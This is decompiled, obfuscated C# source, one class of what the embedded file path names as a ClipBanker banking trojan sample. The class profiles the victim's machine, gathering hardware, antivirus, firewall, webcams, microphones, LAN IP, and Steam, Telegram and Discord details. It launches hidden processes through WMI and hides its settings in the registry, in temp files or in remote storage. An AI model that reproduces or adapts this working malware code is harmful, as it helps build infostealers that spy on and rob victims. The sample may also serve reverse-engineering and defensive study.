// Decompiled with JetBrains decompiler
// Type: crD.xY7
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using \u0031xm;
using \u0032K4;
using \u003544;
using \u0035J5;
using H16;
using l6z;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using V89;
using xK2;

namespace crD
{
  internal static class xY7
  {
    private static string UoG = (string) null;
    private static readonly string[] \u0031xT = new string[6]
    {
      "B",
      "KB",
      "MB",
      "GB",
      "TB",
      "PB"
    };
    private static Mutex \u0037cm;
    private static readonly \u003192 fv2 = new \u003192();
    private static Dictionary<string, string> \u0039uV = new Dictionary<string, string>();

    public static string \u0032L7([In] string obj0) => obj0.Replace("{USERNAME}", \u0036D4.k4d()).Replace("{SYSTEMDRIVE}", Path.GetPathRoot(Environment.SystemDirectory).Replace("\\", ""));

    public static List<\u003858> \u003911() => new List<\u003858>()
    {
      new \u003858("GPUName", \u0036D4.JTu()),
      new \u003858("CPUName", \u0036D4.IJ3()),
      new \u003858("Webcams", u8L.B22()),
      new \u003858("Microphones", u8L.cub()),
      new \u003858("BIOS", \u0036D4.H98()),
      new \u003858("LANIP", \u0036D4.IP8()),
      new \u003858("Antivirus", \u0036D4.\u0039C1()),
      new \u003858("Firewall", \u0036D4.b7f()),
      new \u003858("Motherboard", \u0036D4.Emi()),
      new \u003858("RAM", \u0036D4.\u0032tO()),
      new \u003858("Screens", u8L.j8E()),
      new \u003858("SteamPath", u8L.W33()),
      new \u003858("SteamLang", u8L.Tf7()),
      new \u003858("SteamUser", u8L.\u003756()),
      new \u003858("SteamUserID", u8L.\u003777()),
      new \u003858("SteamApps", u8L.Gw2()),
      new \u003858("TelegramPath", u8L.e47()),
      new \u003858("DiscordPath", u8L.Gpv()),
      new \u003858("FrameworkVersion", \u0036D4.t7B()),
      new \u003858("Path", Path.GetDirectoryName(Ej4.\u0034Jt))
    };

    public static string \u003668([In] DriveType obj0)
    {
      switch (obj0)
      {
        case DriveType.Removable:
          return "Removable Drive";
        case DriveType.Fixed:
          return "Local Disk";
        case DriveType.Network:
          return "Network Drive";
        default:
          return obj0.ToString();
      }
    }

    public static string \u003842([In] int obj0)
    {
      StringBuilder stringBuilder = new StringBuilder(obj0);
      for (int index = 0; index < obj0; ++index)
        stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[xY7.fv2.y4D("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
      return stringBuilder.ToString();
    }

    public static int \u0037U5([In] string obj0)
    {
      using (ManagementClass managementClass1 = new ManagementClass("Win32_Process"))
      {
        ManagementClass managementClass2 = new ManagementClass("Win32_ProcessStartup");
        managementClass2.Properties["CreateFlags"].Value = (object) 8;
        ManagementBaseObject methodParameters = managementClass1.GetMethodParameters("Create");
        methodParameters["CommandLine"] = (object) obj0;
        methodParameters["ProcessStartupInformation"] = (object) managementClass2;
        ManagementBaseObject managementBaseObject = managementClass1.InvokeMethod("Create", methodParameters, (InvokeMethodOptions) null);
        return managementBaseObject != null && (uint) managementBaseObject.Properties["ReturnValue"].Value > 0U ? (int) managementBaseObject.Properties["ProcessId"].Value : 0;
      }
    }

    public static string \u0037bI([In] string obj0)
    {
      char[] charArray = obj0.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    public static string B84()
    {
      if (xY7.UoG == null)
      {
        string str = xY7.\u003842(10);
        try
        {
          File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData\\Local\\Temp") + "\\" + str, xY7.\u003842(25));
          xY7.UoG = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData\\Local\\Temp");
          File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData\\Local\\Temp") + "\\" + str);
        }
        catch
        {
          try
          {
            File.WriteAllText(Path.GetDirectoryName(Ej4.\u0034Jt) + "\\" + str, xY7.\u003842(25));
            xY7.UoG = Path.GetDirectoryName(Ej4.\u0034Jt);
            File.Delete(Path.GetDirectoryName(Ej4.\u0034Jt) + "\\" + str);
          }
          catch
          {
            File.WriteAllText(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\" + str, xY7.\u003842(25));
            xY7.UoG = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public";
            File.Delete(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\" + str);
          }
        }
      }
      return xY7.UoG;
    }

    public static byte[] \u003177([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      byte[] destinationArray = new byte[obj0.Length - obj2];
      Array.Copy((Array) obj0, 0, (Array) destinationArray, 0, obj1);
      Array.Copy((Array) obj0, obj1 + obj2, (Array) destinationArray, obj1, obj0.Length - obj1 - obj2);
      return destinationArray;
    }

    public static bool \u0036Ub([In] string obj0)
    {
      try
      {
        Mutex.OpenExisting(obj0);
      }
      catch
      {
        xY7.\u0037cm = new Mutex(true, obj0);
        return true;
      }
      return false;
    }

    public static bool \u0038n2()
    {
      try
      {
        xY7.\u0037cm.Dispose();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static List<string> IPV([In] string obj0, [In] int obj1)
    {
      List<string> stringList = new List<string>();
      if (obj1 > obj0.Length)
      {
        stringList.Add(obj0);
        return stringList;
      }
      int startIndex = 0;
      bool flag = false;
      do
      {
        stringList.Add(obj0.Substring(startIndex, obj1));
        startIndex += obj1;
        if (obj1 > obj0.Length - startIndex)
          flag = true;
      }
      while (!flag);
      stringList.Add(obj0.Substring(startIndex, obj0.Length - startIndex));
      return stringList;
    }

    public static string \u003812([In] double obj0)
    {
      double num = obj0;
      int index;
      for (index = 0; num >= 1024.0 && index + 1 < xY7.\u0031xT.Length; num /= 1024.0)
        ++index;
      return string.Format("{0:0.##} {1}", (object) num, (object) xY7.\u0031xT[index]);
    }

    public static string c36([In] long obj0)
    {
      double num = (double) obj0;
      int index;
      for (index = 0; num >= 1024.0 && index + 1 < xY7.\u0031xT.Length; num /= 1024.0)
        ++index;
      return string.Format("{0:0.##} {1}", (object) num, (object) xY7.\u0031xT[index]);
    }

    public static void \u0031cL([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3)
    {
      try
      {
        if (Ej4.\u0036b6 != 2 || !File.Exists(Path.GetTempPath() + "\\tmp" + aw8.\u00311f(Ej4.nSx + Ej4.\u0033Go).Substring(0, 5).ToUpper() + ".tmp"))
          return;
        foreach (KeyValuePair<string, string> keyValuePair in aw8.P38(File.ReadAllText(Path.GetTempPath() + "\\tmp" + aw8.\u00311f(Ej4.nSx + Ej4.\u0033Go).Substring(0, 5).ToUpper() + ".tmp")).dtU<Dictionary<string, string>>())
        {
          try
          {
            g79.\u0036A1("__bcached_" + keyValuePair.Key, keyValuePair.Value, obj0, obj1, obj2, obj3);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    public static void \u003265()
    {
      try
      {
        if (Ej4.\u0036b6 != 2)
          return;
        File.WriteAllText(Path.GetTempPath() + "\\tmp" + aw8.\u00311f(Ej4.nSx + Ej4.\u0033Go).Substring(0, 5).ToUpper() + ".tmp", aw8.tt4(xY7.\u0039uV.LE3(), true));
      }
      catch
      {
      }
    }

    public static void \u00369d(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      Dictionary<string, object> dictionary = new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>();
      switch (Ej4.\u0036b6)
      {
        case 0:
          RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\\\" + aw8.\u00311f((string) dictionary["MUTEX"] + Ej4.nSx + Ej4.\u0033Go));
          subKey.SetValue(aw8.\u00311f((string) dictionary["MUTEX"] + obj0), (object) aw8.tt4(obj1, true));
          subKey.Close();
          break;
        case 1:
          File.WriteAllText(Path.Combine(Path.GetTempPath() + "\\" + aw8.\u00311f((string) dictionary["MUTEX"]) + Ej4.nSx + Ej4.\u0033Go + aw8.\u00311f((string) dictionary["MUTEX"] + obj0)), aw8.tt4(obj1, true));
          break;
        case 2:
          g79.\u0036A1("__bcached_" + aw8.\u00311f(obj0), obj1, obj2, obj3, obj4, obj5);
          break;
      }
    }

    public static void i3r([In] string obj0, [In] string obj1)
    {
      Dictionary<string, object> dictionary = new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>();
      switch (Ej4.\u0036b6)
      {
        case 0:
          RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\\\" + aw8.\u00311f((string) dictionary["MUTEX"] + Ej4.nSx + Ej4.\u0033Go));
          subKey.SetValue(aw8.\u00311f((string) dictionary["MUTEX"] + obj0), (object) aw8.tt4(obj1, true));
          subKey.Close();
          break;
        case 1:
          File.WriteAllText(Path.Combine(Path.GetTempPath() + "\\" + aw8.\u00311f((string) dictionary["MUTEX"]) + Ej4.nSx + Ej4.\u0033Go + aw8.\u00311f((string) dictionary["MUTEX"] + obj0)), aw8.tt4(obj1, true));
          break;
        case 2:
          xY7.\u0039uV[aw8.\u00311f(obj0)] = obj1;
          break;
      }
    }

    public static string s12([In] string obj0, [In] string obj1, [In] string obj2, [In] string obj3, [In] string obj4)
    {
      Dictionary<string, object> dictionary = new string(Ej4.\u0038R6).dtU<Dictionary<string, object>>();
      switch (Ej4.\u0036b6)
      {
        case 0:
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\\\" + aw8.\u00311f((string) dictionary["MUTEX"] + Ej4.nSx + Ej4.\u0033Go));
          return registryKey != null ? aw8.P38(registryKey.GetValue(aw8.\u00311f((string) dictionary["MUTEX"] + obj0)).ToString()) : (string) null;
        case 1:
          return aw8.P38(File.ReadAllText(Path.Combine(Path.GetTempPath() + "\\" + aw8.\u00311f((string) dictionary["MUTEX"]) + Ej4.nSx + Ej4.\u0033Go + aw8.\u00311f((string) dictionary["MUTEX"] + obj0))));
        case 2:
          return obj1 == null ? (xY7.\u0039uV.ContainsKey(aw8.\u00311f(obj0)) ? xY7.\u0039uV[aw8.\u00311f(obj0)] : (string) null) : g79.\u0031Tb("__bcached_" + aw8.\u00311f(obj0), obj1, obj2, obj3, obj4);
        default:
          return (string) null;
      }
    }
  }
}
